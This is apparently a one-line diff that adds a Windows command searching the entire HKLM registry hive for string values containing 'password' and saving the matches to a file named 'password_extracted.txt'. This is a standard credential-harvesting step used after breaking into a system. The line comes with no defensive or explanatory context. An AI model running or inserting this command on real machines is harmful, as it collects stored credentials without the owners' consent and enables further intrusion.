@@ -1,0 +1,1 @@
+reg query HKLM /f password /t REG_SZ /s > password_extracted.txt
